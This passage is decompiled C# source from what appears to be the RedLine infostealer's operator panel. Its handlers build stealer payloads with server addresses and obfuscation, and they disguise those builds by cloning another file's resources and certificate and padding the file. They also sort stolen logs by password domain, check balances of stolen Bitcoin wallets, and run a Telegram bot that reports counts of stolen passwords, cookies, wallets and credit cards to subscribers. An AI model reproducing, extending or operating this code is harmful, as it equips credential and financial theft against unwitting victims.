						foreach (string domain in array)
						{
							Invoke((MethodInvoker)delegate
							{
								((Control)this.m_a2).Text = domain;
							});
							LogSorter logSorter = new LogSorter(Path.Combine(folderSelectDialog.FileName, domain), new SingleSearchParams
							{
								LogFrom = DateTime.MinValue,
								LogTo = DateTime.MaxValue,
								PasswordDomain = domain
							}, writeCounters: true);
							logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate(uint index, uint total)
							{
								MainFrm mainFrm = this;
								int index = (int)index;
								int total = (int)total;
								Invoke((MethodInvoker)delegate
								{
									((Control)mainFrm.m_a0).Text = $"{index} / {total}";
								});
							});
							logSorter.Sort();
						}
						Invoke((MethodInvoker)delegate
						{
							((Control)this.m_a0).Text = "Waiting";
							((Control)this.m_a2).Text = "None";
						});
						MessageBox.Show(this, "Success");
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(this, "Error: " + ex.ToString());
				}
			});
		}
		else
		{
			MessageBox.Show(this, "Please, enter a domains");
		}
		((MetroSetButton)sortDomain).Enabled = true;
	}

	private async void a9_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				OpenFileDialog ofd = new OpenFileDialog();
				try
				{
					ofd.Filter = "Ico files (*.ico)|*.ico";
					ofd.CheckPathExists = true;
					ofd.InitialDirectory = Directory.GetCurrentDirectory();
					ofd.RestoreDirectory = true;
					ofd.Multiselect = false;
					Invoke((MethodInvoker)delegate
					{
						if (ofd.ShowDialog(this) == DialogResult.OK)
						{
							((AnimaTextBox)this.m_aa).Text = ofd.FileName;
						}
					});
				}
				finally
				{
					if (ofd != null)
					{
						((IDisposable)ofd).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private async void a8_Click(object sender, object e)
	{
		((MetroSetButton)this.m_a8).Enabled = false;
		((Control)this.m_a8).Text = "Building";
		string serverIp = ((AnimaTextBox)this.m_a6).Text;
		string buildId = ((AnimaTextBox)this.m_a4).Text;
		string icoPath = ((AnimaTextBox)this.m_aa).Text;
		string message = ((AnimaTextBox)errorMessageTb).Text;
		bool byParts = ((MetroSetCheckBox)sendLogByPartsCb).Checked;
		bool obfuscate = ((MetroSetCheckBox)obfuscateCheckBox).Checked;
		string[] ips = serverIp.Split('|');
		string[] array = ips;
		foreach (string text in array)
		{
			if (!IPAddress.TryParse(text, out var _) && !new Regex("^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\\.)+[A-Za-z]{2,6}$").IsMatch(text))
			{
				MessageBox.Show(this, "'" + text + "' is invalid address");
				((Control)this.m_a8).Text = "Build stealer";
				((MetroSetButton)this.m_a8).Enabled = true;
				return;
			}
		}
		await Task.Factory.StartNew(delegate
		{
		});
		((Control)this.m_a8).Text = "Build stealer";
		((MetroSetButton)this.m_a8).Enabled = true;
	}

	private void b6_Click(object sender, object e)
	{
		((AnimaTextBox)b7).Text = string.Empty;
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Multiselect = false;
		openFileDialog.RestoreDirectory = true;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			((AnimaTextBox)b7).Text = openFileDialog.FileName;
		}
	}

	private void b3_Click(object sender, object e)
	{
		((AnimaTextBox)b4).Text = string.Empty;
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Multiselect = false;
		openFileDialog.RestoreDirectory = true;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			((AnimaTextBox)b4).Text = openFileDialog.FileName;
		}
	}

	private async void ad_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)b7).Text))
		{
			MessageBox.Show(this, "Choose target file");
			return;
		}
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)b4).Text))
		{
			MessageBox.Show(this, "Choose build file");
			return;
		}
		if (!((MetroSetCheckBox)b0).Checked && !((MetroSetCheckBox)this.m_ae).Checked)
		{
			MessageBox.Show(this, "You must to enable assembly info or certificate in settings");
			return;
		}
		bool cert = ((MetroSetCheckBox)this.m_ae).Checked;
		bool info = ((MetroSetCheckBox)b0).Checked;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				if (info)
				{
					FileCopyCreator.CloneResources(((AnimaTextBox)b7).Text, ((AnimaTextBox)b4).Text);
				}
				if (cert)
				{
					FileCopyCreator.CloneCertificate(((AnimaTextBox)b7).Text, ((AnimaTextBox)b4).Text);
				}
				MessageBox.Show(this, "Done. Check your build file");
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private void bc_Click(object sender, object e)
	{
		((AnimaTextBox)bd).Text = string.Empty;
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Multiselect = false;
		openFileDialog.RestoreDirectory = true;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			((AnimaTextBox)bd).Text = openFileDialog.FileName;
		}
	}

	private async void b9_Click(object sender, object e)
	{
		if (!string.IsNullOrWhiteSpace(((AnimaTextBox)bd).Text))
		{
			if (!string.IsNullOrWhiteSpace(((AnimaTextBox)ba).Text))
			{
				if (!long.TryParse(((AnimaTextBox)ba).Text, out var result))
				{
					MessageBox.Show(this, "Enter a valid count of bytes");
					return;
				}
				if (result <= 0L)
				{
					MessageBox.Show(this, "Enter a valid count of bytes. Must be more then zero");
				}
				await Task.Factory.StartNew(delegate
				{
					try
					{
						List<byte> list = System.IO.File.ReadAllBytes(((AnimaTextBox)bd).Text).ToList();
						for (int i = 0; i < result; i++)
						{
							list.Add(0);
						}
						System.IO.File.WriteAllBytes(((AnimaTextBox)bd).Text, list.ToArray());
						MessageBox.Show(this, "Done. Check your file");
					}
					catch (Exception ex)
					{
						MessageBox.Show(this, "Error: " + ex.Message);
					}
				});
			}
			else
			{
				MessageBox.Show(this, "Enter a valid count of bytes");
			}
		}
		else
		{
			MessageBox.Show(this, "Choose a file to pump");
		}
	}

	private void bf_Click(object sender, object e)
	{
		Hide();
		((NotifyIcon)object_15).Visible = true;
		((NotifyIcon)object_15).ShowBalloonTip(3);
	}

	private void method_5(object sender, object e)
	{
		((ListBox)getFilesSettingsLb).Items.RemoveAt(((ListControl)getFilesSettingsLb).SelectedIndex);
	}

	private async void ca_Click(object sender, object e)
	{
		try
		{
			nint num = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage;
			LazyLoader<UserLogsDb>.Instance.PageController.Pages[(int)num].RaiseListChangedEvents = false;
			LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
			if (((DataGridView)logsListView).SelectedRows.Count <= 0)
			{
				return;
			}
			List<int> list = new List<int>();
			List<int> list2 = new List<int>();
			foreach (DataGridViewRow selectedRow in ((DataGridView)logsListView).SelectedRows)
			{
				list2.Add(selectedRow.Index);
				list.Add((int)selectedRow.Cells[0].Value);
			}
			for (int i = 0; i < list2.Count; i++)
			{
				try
				{
					int num2 = list2[i];
					if (!string.IsNullOrWhiteSpace((string)object_6))
					{
						((Collection<UserLog>)object_5).RemoveAt(num2);
						((BindingList<UserLog>)object_5).ResetItem(num2);
					}
				}
				catch (Exception)
				{
				}
			}
			foreach (int index in list)
			{
				await Task.Factory.StartNew(delegate
				{
					try
					{
						LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == index);
					}
					catch (Exception)
					{
					}
				});
			}
			LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
			LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
			LazyLoader<UserLogsDb>.Instance.PageController.Clear();
			LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
			if (LazyLoader<UserLogsDb>.Instance.PageController.PagesCount >= num)
			{
				LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = (int)num;
			}
			else
			{
				LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount - 1;
			}
		}
		catch (Exception ex2)
		{
			MessageBox.Show(this, "Error: " + ex2.Message);
		}
	}

	private async void cb_Click(object sender, object e)
	{
		try
		{
			object_6 = ((AnimaTextBox)cc).Text;
			((Collection<UserLog>)object_5).Clear();
			if (!string.IsNullOrWhiteSpace((string)object_6))
			{
				((Control)backPageBtn).Visible = false;
				((Control)nextPageBtn).Visible = false;
				((Control)goToPageBtn).Visible = false;
				((Control)pageNumberTb).Visible = false;
				((Control)totalPages).Visible = false;
				((Control)currentPage).Visible = false;
				((Control)totalPagesLbl).Visible = false;
				((Control)currentPageLbl).Visible = false;
				await Task.Factory.StartNew(delegate
				{
					UserLog[] array = new UserLog[0];
					lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
					{
						array = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
					}
					UserLog[] array2 = array;
					for (int i = 0; i < array2.Length; i++)
					{
						UserLog item = array2[i];
						if (item.IsMatch((string)object_6))
						{
							((Collection<UserLog>)object_5).Add(item);
						}
					}
				});
				if (((IEnumerable<UserLog>)object_5).Any())
				{
					if (!base.InvokeRequired)
					{
						((DataGridView)logsListView).DataSource = object_5;
						return;
					}
					Invoke((MethodInvoker)delegate
					{
						((DataGridView)logsListView).DataSource = object_5;
					});
					return;
				}
				MessageBox.Show(this, "Not found");
				object obj = backPageBtn;
				object obj2 = nextPageBtn;
				object obj3 = goToPageBtn;
				object obj4 = pageNumberTb;
				object obj5 = totalPages;
				object obj6 = currentPage;
				object obj7 = totalPagesLbl;
				((Control)currentPageLbl).Visible = true;
				((Control)obj7).Visible = true;
				((Control)obj6).Visible = true;
				((Control)obj5).Visible = true;
				((Control)obj4).Visible = true;
				((Control)obj3).Visible = true;
				((Control)obj2).Visible = true;
				((Control)obj).Visible = true;
				return;
			}
			((Control)backPageBtn).Visible = true;
			((Control)nextPageBtn).Visible = true;
			((Control)goToPageBtn).Visible = true;
			((Control)pageNumberTb).Visible = true;
			((Control)totalPages).Visible = true;
			((Control)currentPage).Visible = true;
			((Control)totalPagesLbl).Visible = true;
			((Control)currentPageLbl).Visible = true;
			if (base.InvokeRequired)
			{
				Invoke((MethodInvoker)delegate
				{
					LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage;
				});
			}
			else
			{
				LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage;
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	private async void ce_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				lock (a)
				{
					((StatisticDb)object_8).SetDefault();
					((StatisticDb)object_8).SaveSettings();
				}
				UpdateStat();
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void d3_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				OpenFileDialog ofd = new OpenFileDialog();
				try
				{
					ofd.Filter = "Txt files (*.txt)|*.txt";
					ofd.CheckPathExists = true;
					ofd.InitialDirectory = Directory.GetCurrentDirectory();
					ofd.RestoreDirectory = true;
					ofd.Multiselect = false;
					Invoke((MethodInvoker)delegate
					{
						if (ofd.ShowDialog(this) == DialogResult.OK)
						{
							string[] array = System.IO.File.ReadAllLines(ofd.FileName);
							foreach (string item in array)
							{
								((ListBox)getFilesSettingsLb).Items.Add(item);
							}
						}
					});
				}
				finally
				{
					if (ofd != null)
					{
						((IDisposable)ofd).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private void d9_Click(object sender, object e)
	{
		((ListBox)domainDetectorLb).Items.RemoveAt(((ListControl)domainDetectorLb).SelectedIndex);
	}

	private void d8_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((ListBox)domainDetectorLb).SelectedItems.Count == 0;
	}

	private void d5_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)d6).Text))
		{
			MessageBox.Show(this, "Please enter a domain pattern");
			return;
		}
		((ListBox)domainDetectorLb).Items.Add(((AnimaTextBox)d6).Text);
		((AnimaTextBox)d6).Text = string.Empty;
	}

	private async void d4_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				OpenFileDialog ofd = new OpenFileDialog();
				try
				{
					ofd.Filter = "Txt files (*.txt)|*.txt";
					ofd.CheckPathExists = true;
					ofd.InitialDirectory = Directory.GetCurrentDirectory();
					ofd.RestoreDirectory = true;
					ofd.Multiselect = false;
					Invoke((MethodInvoker)delegate
					{
						if (ofd.ShowDialog(this) == DialogResult.OK)
						{
							string[] array = System.IO.File.ReadAllLines(ofd.FileName);
							foreach (string item in array)
							{
								((ListBox)domainDetectorLb).Items.Add(item);
							}
						}
					});
				}
				finally
				{
					if (ofd != null)
					{
						((IDisposable)ofd).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private async void db_Click(object sender, object e)
	{
		int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
				if (userLog.Exceptions == null || userLog.Exceptions.Count <= 0)
				{
					MessageBox.Show(this, "Not found");
				}
				else
				{
					new ExceptionsViewer(userLog.Exceptions).ShowDialog(this);
				}
				userLog = default(UserLog);
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private void openWalletBtn_Click(object sender, object e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Multiselect = false;
			openFileDialog.RestoreDirectory = true;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string input = System.IO.File.ReadAllText(openFileDialog.FileName);
				Regex regex = new Regex("\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\\b");
				if (regex.IsMatch(input))
				{
					Match match = regex.Match(input);
					double num = (double)new WebClient().DownloadString("https://api.blockcypher.com/v1/btc/main/addrs/" + match).FromJSON<BtcBalanceRoot>().final_balance / 100000000.0;
					MessageBox.Show($"Balance: {num} BTC");
				}
				else
				{
					MessageBox.Show(this, "BTC adress not found");
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	private void logsListView_DataError(object sender, object e)
	{
		try
		{
			((DataGridViewDataErrorEventArgs)e).ThrowException = false;
			((CancelEventArgs)e).Cancel = false;
		}
		catch
		{
		}
	}

	private void e1_Click(object sender, object e)
	{
		((ListBox)blackListIPsLb).Items.RemoveAt(((ListControl)blackListIPsLb).SelectedIndex);
	}

	private void e0_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((ListBox)blackListIPsLb).SelectedItems.Count == 0;
	}

	private void addBlackIPBtn_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)blackIPTb).Text))
		{
			MessageBox.Show(this, "Please enter an IP");
			return;
		}
		((ListBox)blackListIPsLb).Items.Add(((AnimaTextBox)blackIPTb).Text);
		((AnimaTextBox)blackIPTb).Text = string.Empty;
	}

	private async void importIPs_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				OpenFileDialog ofd = new OpenFileDialog();
				try
				{
					ofd.Filter = "Txt files (*.txt)|*.txt";
					ofd.CheckPathExists = true;
					ofd.InitialDirectory = Directory.GetCurrentDirectory();
					ofd.RestoreDirectory = true;
					ofd.Multiselect = false;
					Invoke((MethodInvoker)delegate
					{
						if (ofd.ShowDialog(this) == DialogResult.OK)
						{
							string[] array = System.IO.File.ReadAllLines(ofd.FileName);
							foreach (string item in array)
							{
								((ListBox)blackListIPsLb).Items.Add(item);
							}
						}
					});
				}
				finally
				{
					if (ofd != null)
					{
						((IDisposable)ofd).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private void e6_Click(object sender, object e)
	{
		Process.Start("https://t.me/spectrcrypt_bot");
	}

	private async void ed_Click(object sender, object e)
	{
		((MetroSetButton)ed).Enabled = false;
		if (!string.IsNullOrWhiteSpace(((AnimaTextBox)ee).Text))
		{
			if (string.IsNullOrWhiteSpace(((AnimaTextBox)dataFormatSavingTb).Text))
			{
				MessageBox.Show(this, "Please, enter a format");
			}
			else
			{
				string[] domains = ((AnimaTextBox)ee).Text.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
				SingleSearchParams singleSearch = new SingleSearchParams
				{
					SaveAccounts = true,
					SavingFormat = ((AnimaTextBox)dataFormatSavingTb).Text,
					LogFrom = ((DateTimePicker)logDateFromDTP).Value,
					LogTo = ((DateTimePicker)logDateToDTP).Value
				};
				await Task.Factory.StartNew(delegate
				{
					try
					{
						FolderSelectDialog folderSelectDialog = new FolderSelectDialog
						{
							InitialDirectory = Directory.GetCurrentDirectory(),
							Title = "Choose directory to save logs"
						};
						if (folderSelectDialog.Show(base.Handle))
						{
							string[] array = domains;
							foreach (string domain in array)
							{
								Invoke((MethodInvoker)delegate
								{
									((Control)eb).Text = domain;
								});
								singleSearch.PasswordDomain = domain;
								LogSorter logSorter = new LogSorter(folderSelectDialog.FileName, singleSearch);
								logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate(uint index, uint total)
								{
									MainFrm mainFrm = this;
									int index = (int)index;
									int total = (int)total;
									Invoke((MethodInvoker)delegate
									{
										((Control)mainFrm.ef).Text = $"{index} / {total}";
									});
								});
								logSorter.Sort();
							}
							Invoke((MethodInvoker)delegate
							{
								((Control)ef).Text = "Waiting";
								((Control)eb).Text = "None";
							});
							MessageBox.Show(this, "Success");
						}
					}
					catch (Exception ex)
					{
						MessageBox.Show(this, "Error: " + ex.ToString());
					}
				});
			}
		}
		else
		{
			MessageBox.Show(this, "Please, enter a domains");
		}
		((MetroSetButton)ed).Enabled = true;
	}

	private async void f3_Click(object sender, object e)
	{
		method_6();
	}

	private async void method_6()
	{
		try
		{
			if (((Control)f3).Text == "Start")
			{
				if (string.IsNullOrWhiteSpace(((AnimaTextBox)f6).Text))
				{
					MessageBox.Show(this, "Please, enter an API Token");
					return;
				}
				lock (settingsLock)
				{
					RemoteClientSettings.TelegramBotToken = ((AnimaTextBox)f6).Text;
					RemoteClientSettings.SaveSettings();
				}
				object_4 = new TelegramBotClient(RemoteClientSettings.TelegramBotToken);
				((TelegramBotClient)object_4).OnUpdate += OnUpdate;
				if (!(await ((TelegramBotClient)object_4).TestApiAsync(default(CancellationToken))))
				{
					MessageBox.Show(this, "TestAPI not passed.");
					return;
				}
				((TelegramBotClient)object_4).SetWebhookAsync("", (InputFileStream)null, (string)null, 0, (IEnumerable<UpdateType>)null, dropPendingUpdates: false, default(CancellationToken)).Wait();
				((TelegramBotClient)object_4).StartReceiving((UpdateType[])null, default(CancellationToken));
				intptr_1 = (IntPtr)1;
				((Control)f4).Text = "Working";
				((Control)f3).Text = "Stop";
			}
			else
			{
				((TelegramBotClient)object_4)?.StopReceiving();
				object_4 = null;
				((Control)f4).Text = "Waiting";
				intptr_1 = (IntPtr)0;
				((Control)f3).Text = "Start";
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	public async void StartCommand(Update update)
	{
		ReplyKeyboardMarkup replyKeyboardMarkup = new ReplyKeyboardMarkup();
		replyKeyboardMarkup.Keyboard = new KeyboardButton[1][] { new KeyboardButton[2]
		{
			new KeyboardButton("\ud83d\udc68\u200d\ud83d\udcbb Request access"),
			new KeyboardButton("\ud83d\udcca Statistic")
		} };
		replyKeyboardMarkup.ResizeKeyboard = true;
		ReplyKeyboardMarkup replyMarkup = replyKeyboardMarkup;
		if (!(update.Message.Text.Trim() == "/start"))
		{
			await ((TelegramBotClient)object_4).PreSafeSendTextMessage(update.Message.Chat.Id, "\ud83d\udc47 Select category", ParseMode.Default, null, disableWebPagePreview: false, disableNotification: false, 0, allowSendingWithoutReply: false, replyMarkup);
		}
		else
		{
			await ((TelegramBotClient)object_4).PreSafeSendTextMessage(update.Message.Chat.Id, "Welcome to RedLine Bot. You have to request access to get logs.", ParseMode.Default, null, disableWebPagePreview: false, disableNotification: false, 0, allowSendingWithoutReply: false, replyMarkup);
		}
	}

	public async void StatisticCommand(Update argument)
	{
		List<string> list = new List<string>();
		lock (((TelegramChatsDb)this.m_e).RootLocker)
		{
			IEnumerable<string> enumerable = ((TelegramChatsDb)this.m_e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
			List<string> list2;
			if (enumerable != null)
			{
				list2 = enumerable.ToList();
				if (list2 != null)
				{
					goto IL_007c;
				}
			}
			list2 = new List<string>();
			goto IL_007c;
			IL_007c:
			list = list2;
		}
		List<string> list3 = new List<string>();
		lock (((TelegramChatsDb)this.m_e).RootLocker)
		{
			try
			{
				if (System.IO.File.Exists("blackListChats.ini"))
				{
					list3.AddRange(System.IO.File.ReadAllLines("blackListChats.ini"));
				}
			}
			catch
			{
			}
		}
		if (!list.Contains(argument.Message.Chat.Id.ToString()) || list3.Contains(argument.Message.Chat.Id.ToString()))
		{
			await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, "⛔\ufe0f Now allowed");
			return;
		}
		StringBuilder stringBuilder = new StringBuilder();
		lock (a)
		{
			stringBuilder.AppendLine($"\ud83d\udcda Total logs: {LazyLoader<UserLogsDb>.Instance.RedLine_002EMainPanel_002EModels_002EDB_002EDbController_003CTItem_003E_002ECount}");
			stringBuilder.AppendLine($"\ud83d\udddd Passwords: {((StatisticDb)object_8).Passwords}");
			stringBuilder.AppendLine($"\ud83c\udf6a Cookies: {((StatisticDb)object_8).Cookies}");
			stringBuilder.AppendLine($"\ud83d\udcb0 Cold Wallets: {((StatisticDb)object_8).ColdWallets}");
			stringBuilder.AppendLine($"✏\ufe0f AutoFills: {((StatisticDb)object_8).AutoFills}");
			stringBuilder.AppendLine($"\ud83d\udcbe FTPs: {((StatisticDb)object_8).FTPs}");
			stringBuilder.AppendLine($"\ud83d\uddc3 Files: {((StatisticDb)object_8).Files}");
			stringBuilder.AppendLine($"\ud83d\udcb3 Credit cards: {((StatisticDb)object_8).CreditCards}");
		}
		await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, stringBuilder.ToString());
	}

	public async void RequestAccessCommand(Update argument)
	{
		string text;
		try
		{
			Chat chat = await ((TelegramBotClient)object_4).SafeGetChat(new ChatId(argument.Message.Chat.Id));
			text = ((!string.IsNullOrWhiteSpace(chat.Username)) ? ("[Profile](https://t.me/" + chat.Username + ")") : ("[Chat]" + chat.Id));
		}
		catch (Exception)
		{
			text = $"[Chat]{argument.Message.Chat.Id}";
		}
		List<string> list = new List<string>();
		lock (((TelegramChatsDb)this.m_e).RootLocker)
		{
			IEnumerable<string> enumerable = ((TelegramChatsDb)this.m_e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
			List<string> list2;
			if (enumerable != null)
			{
				list2 = enumerable.ToList();
				if (list2 != null)
				{
					goto IL_019b;
				}
			}
			list2 = new List<string>();
			goto IL_019b;
			IL_019b:
			list = list2;
		}
		List<string> list3 = new List<string>();
		lock (((TelegramChatsDb)this.m_e).RootLocker)
		{
			try
			{
				if (System.IO.File.Exists("blackListChats.ini"))
				{
					list3.AddRange(System.IO.File.ReadAllLines("blackListChats.ini"));
				}
			}
			catch
			{
			}
		}
		if (list.Contains(argument.Message.Chat.Id.ToString()) || list3.Contains(argument.Message.Chat.Id.ToString()) || MessageBox.Show(this, "Are you sure you want to add chat?\nCalled from " + text, "Verification", MessageBoxButtons.OKCancel) != DialogResult.OK)
		{
			return;
		}
		lock (((TelegramChatsDb)this.m_e).RootLocker)
		{
			if (CountOfChats() > ((TelegramChatsDb)this.m_e).chatsSettings.Count)
			{
				((TelegramChatsDb)this.m_e).chatsSettings.Add(new TelegramChatSettings
				{
					ChatId = argument.Message.Chat.Id,
					MessageFormat = "Номер: {ID}\r\nБилд: {BuildID}\r\nОС: {OS}\r\nIP: {IP}\r\nДанные: {Creds}\r\nСтрана: {Country}",
					SendingMode = SendingMode.NoAttachments,
					SearchParams = new SingleSearchParams
					{
						LogFrom = DateTime.MinValue,
						LogTo = DateTime.MaxValue
					}
				});
				((TelegramChatsDb)this.m_e).SaveSettings();
			}
			else
			{
				MessageBox.Show(this, "Maximum number of chats has been added");
			}
		}
		UpdateRecipients();
		await ((TelegramBotClient)object_4).PreSafeSendTextMessage(argument.Message.Chat.Id, "✅ Успешно.");
	}

	public void InitCommands()
	{
		((Dictionary<string, Action<Update>>)object_2).Add("/sub", (Action<Update>)RequestAccessCommand);
		((Dictionary<string, Action<Update>>)object_2).Add("\ud83d\udc68\u200d\ud83d\udcbb Request access", (Action<Update>)RequestAccessCommand);
		((Dictionary<string, Action<Update>>)object_2).Add("\ud83d\udcca Statistic", (Action<Update>)StatisticCommand);
		((Dictionary<string, Action<Update>>)object_2).Add("/start", (Action<Update>)StartCommand);
		((Dictionary<string, Action<Update>>)object_2).Add("/menu", (Action<Update>)StartCommand);
	}

	public async void OnUpdate(object sender, UpdateEventArgs e)
	{
		nint num = 0;
		try
		{
			Telegram.Bot.Types.Message message = e.Update.Message;
			if (message != null && message.Type == MessageType.Text)
			{
				try
				{
					string text = e.Update.Message.Text.Trim();
					if (!string.IsNullOrWhiteSpace(text) && ((Dictionary<string, Action<Update>>)object_2).ContainsKey(text))
					{
						((Dictionary<string, Action<Update>>)object_2)[text](e.Update);
						return;
					}
				}
				catch (Exception)
				{
					return;
				}
				await ((TelegramBotClient)object_4).PreSafeSendTextMessage(e.Update.Message.Chat.Id, "⛔\ufe0f Unknown command");
			}
		}
		catch
		{
			num = 1;
		}
		int num2 = (int)num;
		if (num2 == 1)
		{
			await ((TelegramBotClient)object_4).PreSafeSendTextMessage(e.Update.Message.Chat.Id, "⛔\ufe0f Error");
		}
	}

	public async void UpdateRecipients()
	{
		await Task.Factory.StartNew(delegate
		{
			((ListBox)recipientsIdsListBox).Items.Clear();
			lock (((TelegramChatsDb)this.m_e).RootLocker)
			{
				string[] chatIds = ((TelegramChatsDb)this.m_e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString())?.ToArray();
				Invoke((MethodInvoker)delegate
				{
					ListBox.ObjectCollection items = ((ListBox)recipientsIdsListBox).Items;
					object[] items2 = chatIds ?? new string[0];
					items.AddRange(items2);
				});
			}
		});
	}

	private async void addGuest_Click(object sender, object e)
	{
		try
		{
			DateTime result;
			if (string.IsNullOrWhiteSpace(((AnimaTextBox)guestBuildID).Text))
			{
				MessageBox.Show(this, "Please, enter a BuildID");
			}
			else if (!string.IsNullOrWhiteSpace(((AnimaTextBox)guestExpireDate).Text) && !DateTime.TryParseExact(((AnimaTextBox)guestExpireDate).Text.Trim(), "dd.MM.yyyy HH:mm", null, DateTimeStyles.None, out result))
			{
				MessageBox.Show("Invalid date format. Example: 02.05.2020 23:30");
			}
			else if (!((IEnumerable<GuestLink>)LazyLoader<GuestLinksDb>.Instance.DbInstance.ToArray()).Any((Func<GuestLink, bool>)((GuestLink x) => (x.BuildID == ((AnimaTextBox)guestBuildID).Text) ? 1u : 0u)))
			{
				GuestLink guestLink = new GuestLink
				{
					BuildID = ((AnimaTextBox)guestBuildID).Text,
					ExpiresTime = ((AnimaTextBox)guestExpireDate).Text
				};
				await Task.Factory.StartNew(delegate
				{
					guestLink.ID = Md5Helper.GetMd5Hash(guestLink.BuildID + ProfileSettings.Login).ToLower();
					LazyLoader<GuestLinksDb>.Instance.Save(guestLink);
					Invoke((MethodInvoker)delegate
					{
						LazyLoader<GuestLinksDb>.Instance.DbInstance.Add(guestLink);
					});
				});
				object obj = guestBuildID;
				string text = (((AnimaTextBox)guestExpireDate).Text = string.Empty);
				((AnimaTextBox)obj).Text = text;
			}
			else
			{
				MessageBox.Show(this, "Link with this BuildID already exist in database");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private void fd_DoubleClick(object sender, object e)
	{
		if (((DataGridView)fd).SelectedRows.Count > 0)
		{
			Process.Start($"http://{((ServiceSettings)object_3).GuestAdress}:{((ServiceSettings)object_3).GuestPort}/?id={((DataGridView)fd).SelectedRows[0].Cells[0].Value}");
		}
	}

	private void blackListCms_5_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((DataGridView)fd).SelectedRows.Count == 0;
	}

	private async void toolStripMenuItem4_Click(object sender, object e)
	{
		try
		{
			if (((DataGridView)fd).SelectedRows.Count <= 0)
			{
				return;
			}
			List<string> list = new List<string>();
			foreach (DataGridViewRow selectedRow in ((DataGridView)fd).SelectedRows)
			{
				list.Add((string)selectedRow.Cells[0].Value);
			}
			foreach (string selectedItem in list)
			{
				await Task.Factory.StartNew(delegate
				{
					try
					{
						Invoke((MethodInvoker)delegate
						{
							LazyLoader<GuestLinksDb>.Instance.Delete((GuestLink x) => x.ID == selectedItem);
						});
					}
					catch
					{
					}
				});
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private async void checkConnectionBtn_Click(object sender, object e)
	{
		((MetroSetButton)this.m_a8).Enabled = false;
		((MetroSetButton)checkConnectionBtn).Enabled = false;
